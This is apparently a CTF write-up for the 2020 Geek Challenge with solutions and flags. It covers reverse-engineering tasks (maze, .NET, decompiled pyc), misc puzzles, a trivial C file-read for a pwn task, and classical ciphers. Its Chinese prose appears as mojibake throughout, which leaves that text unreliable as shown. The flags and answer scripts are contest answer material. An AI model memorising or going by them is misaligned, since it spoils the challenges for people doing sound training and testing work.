<p>é€†å‘è§£å‡ºè¿·å®«å›¾ï¼Œè·å¾—èµ·å§‹ç‚¹å’Œç»ˆç‚¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">___________ooooo_____o________o</span><br><span class="line">_ooooooooo__ooo__ooo_oooooooooo</span><br><span class="line">_oooooooooo__o__oooo_oooooooooo</span><br><span class="line">________oooo___ooooo_oooooooooo</span><br><span class="line">ooooooo_oooooooooooo_oooooooooo</span><br><span class="line">ooooooo_ooooo_oooooo_oooooooooo</span><br><span class="line">ooooooo_ooooo_oooooo_oooooooooo</span><br><span class="line">S_______ooooo_oooooo__________E</span><br><span class="line">ooooooooooooooooooooooooooooooo</span><br></pre></td></tr></table></figure>

<p>flagå°±æ˜¯è·¯çº¿ï¼Œå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;dddddddwwwwaaaaaaawwwddddddddddsdsdsddwdwdwddddsssssssdddddddddd&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Hello-NET"><a href="#Hello-NET" class="headerlink" title="Hello.NET"></a>Hello.NET</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">numArray=[<span class="number">18</span>,<span class="number">14</span>,<span class="number">40</span>,-<span class="number">14</span>,-<span class="number">2</span>,<span class="number">30</span>,<span class="number">10</span>,<span class="number">42</span>,<span class="number">35</span>,<span class="number">48</span>,<span class="number">43</span>,<span class="number">49</span>,<span class="number">52</span>,<span class="number">72</span>,<span class="number">57</span>,<span class="number">68</span>,<span class="number">86</span>,<span class="number">145</span>,<span class="number">115</span>,<span class="number">128</span>,<span class="number">115</span>,<span class="number">86</span>]</span><br><span class="line"><span class="built_in">list</span>=[<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">22</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">list</span>[i]-numArray[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h3 id="un-snake"><a href="#un-snake" class="headerlink" title="un_snake"></a>un_snake</h3><h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œpycæ–‡ä»¶åç¼–è¯‘"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œpycæ–‡ä»¶åç¼–è¯‘" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œpycæ–‡ä»¶åç¼–è¯‘"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ï¼Œpycæ–‡ä»¶åç¼–è¯‘</h4><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªpycæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦å‡†å¤‡ä¸€ä¸ªpythonåº“ï¼Œ<strong>uncompyle6</strong>ï¼Œå¯ä»¥ç›´æ¥å°†pycæ–‡ä»¶åç¼–è¯‘ä¸ºpyæ–‡ä»¶</p>
<blockquote>
<p>pycæ–‡ä»¶åŒçº§ç›®å½•ä¸‹ï¼Œcmd ï¼šuncompyle6 -o pcat.py pcat.pyc</p>
</blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯éœ€è¦å¯¹ä»£ç è¿›è¡Œå®¡è®¡äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:37:02) [MSC v.1924 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ./un_snake.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-05 16:20:40</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1238 bytes</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> this</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">data</span>):</span></span><br><span class="line">    th1s = <span class="string">&#x27;TBESCFSRSAEUITANAIIN&#x27;</span>.encode()</span><br><span class="line">    <span class="keyword">if</span> (data_len := <span class="built_in">len</span>(data)) &gt; (th1s_len := <span class="built_in">len</span>(th1s)):</span><br><span class="line">        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, data, th1s))       <span class="comment"># dataå’Œth1sè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œè¿”å›2è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">plain</span>):</span></span><br><span class="line">    plain = <span class="built_in">list</span>(plain)</span><br><span class="line">    plain = plain[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        c = plain[i]</span><br><span class="line">        plain[i] = (c &lt;&lt; <span class="number">3</span> | c &gt;&gt; <span class="number">5</span>) &amp; <span class="number">255</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain) - <span class="number">1</span>):</span><br><span class="line">            plain[i] ^= plain[(i + <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> b64encode(a) == <span class="string">b&#x27;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        stuff = <span class="built_in">input</span>(<span class="string">&#x27;Now input you flag:&#x27;</span>)</span><br><span class="line">        stuff_ready = pre(stuff.encode())</span><br><span class="line">        result = check(enc(stuff_ready))</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            print(<span class="string">&#x27;You get it! Python is so charming right?&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;Failed, try again!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[ğŸ] Commit you flag, see you next time!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªpython3.8ç‰ˆæœ¬è¿›è¡Œç¼–è¾‘çš„ï¼Œä¸éš¾å†™å‡ºè¿˜åŸä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#x27;</span></span><br><span class="line">flag = b64decode(a)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">n = <span class="built_in">len</span>(flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) - <span class="number">1</span>):</span><br><span class="line">    flag[(n - i - <span class="number">1</span>)] ^= flag[(n - i)]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        c = flag[i]</span><br><span class="line">        flag[i] = (c &gt;&gt; <span class="number">3</span> | c &lt;&lt; <span class="number">5</span>) &amp; <span class="number">255</span></span><br><span class="line"></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">th1s = <span class="string">&#x27;TBESCFSRSAEUITANAIIN&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">if</span> (flag_len := <span class="built_in">len</span>(flag)) &gt; (th1s_len := <span class="built_in">len</span>(th1s)):</span><br><span class="line">    th1s = th1s * (flag_len // th1s_len) + th1s[:flag_len - th1s_len]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y,flag, th1s))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><strong>è¡¥å……ï¼š</strong></p>
<blockquote>
<p>ä»python3.8å¼€å§‹ï¼Œæµ·è±¡è¿ç®—ç¬¦è·å¾—æ­£å¼pythonç‰ˆæœ¬çš„æ”¯æŒ</p>
<p><code>:=</code>ï¼šæµ·è±¡è¿ç®—ç¬¦ï¼Œä¼šæŠŠè¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†èµ‹å€¼ç»™å˜é‡ï¼Œæé«˜äº†è¿è¡Œé€Ÿåº¦</p>
<p>ä¸‹é¢ä¸¤ä¸ªçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (n :&#x3D; len(a)) &gt; 10:</span><br><span class="line">    print(f&quot;List is too long (&#123;n&#125; elements, expected &lt;&#x3D; 10)&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; len(a)</span><br><span class="line">if n &gt; 10:</span><br><span class="line">    print(f&quot;List is to long(&#123;n&#125; elements, expected &lt;&#x3D; 10)&quot;)</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ä¸€â€œé¡µâ€éšœç›®"><a href="#ä¸€â€œé¡µâ€éšœç›®" class="headerlink" title="ä¸€â€œé¡µâ€éšœç›®"></a>ä¸€â€œé¡µâ€éšœç›®</h3><h4 id="è€ƒç‚¹ï¼šæ‹¼å›¾"><a href="#è€ƒç‚¹ï¼šæ‹¼å›¾" class="headerlink" title="è€ƒç‚¹ï¼šæ‹¼å›¾"></a>è€ƒç‚¹ï¼šæ‹¼å›¾</h4><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E4%B8%80%E9%A1%B5%E9%9A%9C%E7%9B%AE.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-ä¸€é¡µéšœç›®"></p>
<p>å³è¾¹æ‹¼èµ·æ¥å°±è¡Œäº†</p>
<blockquote>
<p>SYC{syc_20_ver}</p>
</blockquote>
<h3 id="å£®è¨€å£®è¯­"><a href="#å£®è¨€å£®è¯­" class="headerlink" title="å£®è¨€å£®è¯­"></a>å£®è¨€å£®è¯­</h3><h4 id="è€ƒç‚¹ï¼šä½›æ›°è§£ç "><a href="#è€ƒç‚¹ï¼šä½›æ›°è§£ç " class="headerlink" title="è€ƒç‚¹ï¼šä½›æ›°è§£ç "></a>è€ƒç‚¹ï¼šä½›æ›°è§£ç </h4><blockquote>
<p>ä½›æ›°ï¼šè±†æ¢µèƒ½ä½›å†¥è¬¹æ²™æ€¯éš¸é“ç­‰å­•å–ä¼½è¨¶æå¥¢è€¶å°¼æ®¿æ€¯æ€–å¥¢ä¸‰ç¼½å—æ€›ç¼½å¨‘çš¤å¯«æ•¸çš¤ç©¶å‘è€…é†¯çš¤å‹å­•çš¤é¡›çš¤è€¶å¤œå“†æ‚‰ä¾„ç¾¯æ¶…æ‚‰æ€¯è€è‹¥ä¿±å‹è©çŸ¥è©æ‰€è˜‡å¥¢ä»¥æ¢µä¸–å¿ƒäº¦å‘è€¨å¤·å“†è‡³å“†é†¯å³æ³¢æ€¯æ˜é™¤æ€¯é—æ€¯é›†æ€¯å°¼æ˜çš¤å¯¦æ€¯ä¸€å¿ƒç¼½å‘¼ä¾„ç¾¯å¤¢å®¤è«³è€¨å‘æè¿¦æ¢µéƒ½éƒ½å‘å­•ç¤™è«³é‚£å‘å½Œè±†ç¼½æ™ºé®è«³æ§ƒæä¼½ä¿±ç©†é›¢å†¥ä¼Šå†¥é‚£è—ç½°æ‘©è¿¦è«³æœ‰è«³ç›¡å³æ€¯å¤šé€ä¾„å©†å†¥æ¶…ç¥</p>
</blockquote>
<p>ç”¨ä½›æ›°è§£ç å°±å¥½äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘åˆ˜å£®å°±æ˜¯npï¼Œç»™ä½ flagå§,SYC&#123;i_l0ve_Japanese_wife&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ç§˜æŠ€Â·åå¤æ¨ªè·³"><a href="#ç§˜æŠ€Â·åå¤æ¨ªè·³" class="headerlink" title="ç§˜æŠ€Â·åå¤æ¨ªè·³"></a>ç§˜æŠ€Â·åå¤æ¨ªè·³</h3><h4 id="è€ƒç‚¹ï¼šbinwalk"><a href="#è€ƒç‚¹ï¼šbinwalk" class="headerlink" title="è€ƒç‚¹ï¼šbinwalk"></a>è€ƒç‚¹ï¼šbinwalk</h4><p>é¢˜ç›®ç»™äº†ä¸€å¼ ç…§ç‰‡ï¼Œä½†æ˜¯æç¤ºbinwalkï¼Œè¿™æ˜¯å†å›¾ç‰‡é‡Œè—äº†ä¸œè¥¿ï¼Œæˆ‘ä»¬ç”¨binwalkæ‰“å¼€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e FFHT.jpg</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿™ä¸ªäºŒç»´ç ï¼Œæˆ‘ä»¬æ‹¼æˆæ­£å¸¸çš„æ‰«ç å°±å¥½äº†</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%8F%8D%E5%A4%8D%E6%A8%AA%E8%B7%B3.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-åå¤æ¨ªè·³"></p>
<h3 id="æ¥æ‹¼å›¾"><a href="#æ¥æ‹¼å›¾" class="headerlink" title="æ¥æ‹¼å›¾"></a>æ¥æ‹¼å›¾</h3><h4 id="è€ƒç‚¹ï¼šå°±æ˜¯æ‹¼ä¸ªå›¾"><a href="#è€ƒç‚¹ï¼šå°±æ˜¯æ‹¼ä¸ªå›¾" class="headerlink" title="è€ƒç‚¹ï¼šå°±æ˜¯æ‹¼ä¸ªå›¾"></a>è€ƒç‚¹ï¼šå°±æ˜¯æ‹¼ä¸ªå›¾</h4><p>æ‰‹å·¥ï¼Œçœ‹åˆ°å†™äº†å­—çš„å›¾å°±æ‹¿å‡ºæ¥ï¼Œæ‹¼å°±å®Œäº†</p>
<p>å†™è„šæœ¬ï¼Œå°è¯•äº†ï¼Œæ•ˆæœä¸å¤ªå¥½ï¼Œå°±ä¸ç”¨äº†</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="æ•°å­¦å’‹æ ·ï¼Ÿ"><a href="#æ•°å­¦å’‹æ ·ï¼Ÿ" class="headerlink" title="æ•°å­¦å’‹æ ·ï¼Ÿ"></a>æ•°å­¦å’‹æ ·ï¼Ÿ</h3><p>ncè¿ä¸Šåš20é“é¢˜ç›®å°±å¥½äº†</p>
<h3 id="runcode"><a href="#runcode" class="headerlink" title="runcode"></a>runcode</h3><h4 id="è€ƒç‚¹ï¼šcè¯­è¨€"><a href="#è€ƒç‚¹ï¼šcè¯­è¨€" class="headerlink" title="è€ƒç‚¹ï¼šcè¯­è¨€"></a>è€ƒç‚¹ï¼šcè¯­è¨€</h4><p>é¢˜ç›®æç¤ºï¼š</p>
<blockquote>
<p>flagåœ¨/home/ctf/flagï¼Œ ä¸å…è®¸å‡ºç°system, å‡ºç°runtime erroråˆ™é‡æ–°runä¸€ä¸‹</p>
</blockquote>
<p>æˆ‘ä»¬å†™ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„cç¨‹åºå°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">char</span> buff[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">&quot;/home/ctf/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;1: %s\n&quot;</span>, buff );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®"><a href="#äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®" class="headerlink" title="äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®"></a>äºŒæˆ˜æƒ…æŠ¥å‘˜åˆ˜å£®</h3><h4 id="è€ƒç‚¹ï¼šæ‘©æ–¯å¯†ç "><a href="#è€ƒç‚¹ï¼šæ‘©æ–¯å¯†ç " class="headerlink" title="è€ƒç‚¹ï¼šæ‘©æ–¯å¯†ç "></a>è€ƒç‚¹ï¼šæ‘©æ–¯å¯†ç </h4><blockquote>
<p> .-../.â€”-/..-/â€“../â€¦./..-/â€¦.-/-./â€“./..â€“.-/../..â€“.-/â€“../.â€”-/-.â€“/.â€”-</p>
</blockquote>
<p>SYC{l1uzhu4ng_i_z1y1}</p>
<h3 id="é“ ç”²ä¸è¨æ»¡"><a href="#é“ ç”²ä¸è¨æ»¡" class="headerlink" title="é“ ç”²ä¸è¨æ»¡"></a>é“ ç”²ä¸è¨æ»¡</h3><h4 id="è€ƒç‚¹ï¼šå‡¯æ’’å¯†ç "><a href="#è€ƒç‚¹ï¼šå‡¯æ’’å¯†ç " class="headerlink" title="è€ƒç‚¹ï¼šå‡¯æ’’å¯†ç "></a>è€ƒç‚¹ï¼šå‡¯æ’’å¯†ç </h4><blockquote>
<p>YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}</p>
</blockquote>
<p>é€šè¿‡å‡¯æ’’å¯†ç è§£å¾—</p>
<blockquote>
<p>SYC{liuzhuangliuzhuang_bangbangbang}</p>
</blockquote>
<h3 id="è·³è·ƒçš„æŒ‡å°–"><a href="#è·³è·ƒçš„æŒ‡å°–" class="headerlink" title="è·³è·ƒçš„æŒ‡å°–"></a>è·³è·ƒçš„æŒ‡å°–</h3><p>é¢˜ç›®æè¿°:</p>
<blockquote>
<p>wdr qsz awdx thu xdv eft thu ol rgy ilp(æ³¨æ„è¯·å°†è¯·å°†ç­”æ¡ˆå¥—ä¸ŠSYC{}æäº¤)</p>
</blockquote>
<p>å¾ˆç®€ç­”ï¼Œå°±æ˜¯é”®ç›˜å¯†ç </p>
<h3 id="æˆéƒ½å…»çŒªäºŒå‚"><a href="#æˆéƒ½å…»çŒªäºŒå‚" class="headerlink" title="æˆéƒ½å…»çŒªäºŒå‚"></a>æˆéƒ½å…»çŒªäºŒå‚</h3><h4 id="è€ƒç‚¹ï¼šçŒªåœˆå¯†ç -æ …æ å¯†ç "><a href="#è€ƒç‚¹ï¼šçŒªåœˆå¯†ç -æ …æ å¯†ç " class="headerlink" title="è€ƒç‚¹ï¼šçŒªåœˆå¯†ç +æ …æ å¯†ç "></a>è€ƒç‚¹ï¼šçŒªåœˆå¯†ç +æ …æ å¯†ç </h4><p>æç¤ºï¼š</p>
<blockquote>
<p>vå…ˆç”Ÿå®¶é‡Œè›®å¤§çš„ï¼Œè¿˜æœ‰å¾ˆå¤šå•¤é…’ã€‚vå…ˆç”Ÿä¹‹æ‰€ä»¥èƒ½è¿‡ä¸Šè¿™æ ·å¿«å“‰çš„ç”Ÿæ´»å¯èƒ½æ˜¯å› ä¸ºä»–çš„å…»çŒªåœºå‚å›´ä¸Šäº†é«˜é«˜çš„æ …æ </p>
</blockquote>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E6%88%90%E9%83%BD%E5%85%BB%E7%8C%AA%E4%BA%8C%E5%8E%82.jpg" alt="2020æå®¢å¤§æŒ‘æˆ˜-æˆéƒ½å…»çŒªäºŒå‚"></p>
<blockquote>
<p>vå…ˆç”Ÿå–å¾—è¿·è¿·ç³Šç³Šçš„æ—¶å€™è¯´äº†ä¸€äº›èƒ¡è¯,ä½ ä»ä¸€å †å˜Ÿå“ä¸­å¬æ¸…æ¥šäº†å…¶ä¸­ä¸€å°æ®µ:</p>
<p>â€¦(å˜Ÿå“)..<br>(int)sth_import = 889464/114514;<br>â€¦.(å˜Ÿå“)â€¦</p>
</blockquote>
<p>è¿™é‡Œé™¤äº†å¯†ç è¿˜æœ‰ä¸ªæç¤ºï¼Œè§£å‡ºç­”æ¡ˆä¸º7ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œåº”è¯¥å°±æ˜¯æ …æ å¯†ç çš„<strong>æ æ•°</strong></p>
<blockquote>
<p>(int)sth_import = 889464/114514;</p>
</blockquote>
<p>ç°åœ¨å°±æ¥ç ´è§£çŒªåœˆå¯†ç ï¼Œè¿™é‡Œçš„å¯†ç æ˜¯æ‰‹å†™çš„ï¼Œè€Œä¸”å¹¶æ²¡æœ‰æç¤ºä¸€ä¸ªæ˜ç¡®çš„é¡ºåºè¿›è¡Œç ´è§£ï¼Œç†è®ºä¸Šå››ä¸ªæ–¹å‘ä¸Šè¿›è¡Œè§£å¯†éƒ½æ˜¯å¯ä»¥çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æœ€å¤šç ´è§£4æ¬¡å°±èƒ½å‡ºæ¥</p>
<blockquote>
<p>æœ€åè§£å¾—ï¼šssyirceehsagiulisolbhy</p>
<p>å†ç”¨7æ è¿›è¡Œè§£å¯†ï¼šsreausbschglohyesiilyi</p>
</blockquote>
<h3 id="è§„è§„çŸ©çŸ©çš„å·¥ä½œ"><a href="#è§„è§„çŸ©çŸ©çš„å·¥ä½œ" class="headerlink" title="è§„è§„çŸ©çŸ©çš„å·¥ä½œ"></a>è§„è§„çŸ©çŸ©çš„å·¥ä½œ</h3><h4 id="è€ƒç‚¹ï¼šå¸Œå°”åŠ å¯†"><a href="#è€ƒç‚¹ï¼šå¸Œå°”åŠ å¯†" class="headerlink" title="è€ƒç‚¹ï¼šå¸Œå°”åŠ å¯†"></a>è€ƒç‚¹ï¼šå¸Œå°”åŠ å¯†</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>wlzå½“å¹´ç©è¹¦è¹¦è¹¦ä¸ºäº†æŠ½å¸Œå°”æ°ªäº†å¾ˆå¤šé’±</p>
<p>hint1:è®©æˆ‘çœ‹çœ‹æ˜¯è°ä¸å¥½å¥½ä¸Šçº¿ä»£è¯¾ï¼Ÿ</p>
<p>hint2:decodeç¨‹åºå¯èƒ½åŠ è½½çš„æœ‰ç‚¹æ…¢å¹¶ä¸”è¯·åœ¨å‘½ä»¤è¡Œå†…è¿è¡Œ</p>
</blockquote>
<p>çœ‹åˆ°<strong>å¸Œå°”+çº¿æ€§ä»£æ•°</strong>ã€‚ç«‹é©¬å°±èƒ½ååº”åˆ°è€ƒçš„æ˜¯<strong>å¸Œå°”å¯†ç </strong>ï¼Œè¿™æ˜¯æ¯”è¾ƒç®€å•çš„çº¿æ€§ä»£æ•°ï¼Œå…ˆçœ‹çœ‹ä»€ä¹ˆæ˜¯å¸Œå°”åŠ å¯†</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-å¸Œå°”å¯†ç "></p>
<p>çœ‹äº†åŠ å¯†æ‰‹æ³•è®©æˆ‘æƒ³èµ·äº†<strong>ä»¿å°„å¯†ç åŠ å¯†</strong>ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„åŠ å¯†ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†</p>
<p>åœ¨äº†è§£äº†åŠ è§£å¯†åŸç†åï¼Œç°åœ¨æˆ‘ä»¬å†æ¥çœ‹çœ‹é¢˜ç›®</p>
<blockquote>
<p>key_encrypt<br>1 1 1<br>1 2 3<br>1 3 6</p>
<p>encï¼š<br>12<br>12<br>10</p>
</blockquote>
<p>å¾ˆæ˜æ˜¾ï¼Œä¸Šé¢ä¸€ä¸ªçŸ©é˜µå°±æ˜¯å¯†é’¥äº†ï¼Œä¸‹é¢çš„å°±æ˜¯å¯†æ–‡</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%B8%8C%E5%B0%94%E5%8A%A0%E5%AF%862.png" alt="å¸Œå°”åŠ å¯†"></p>
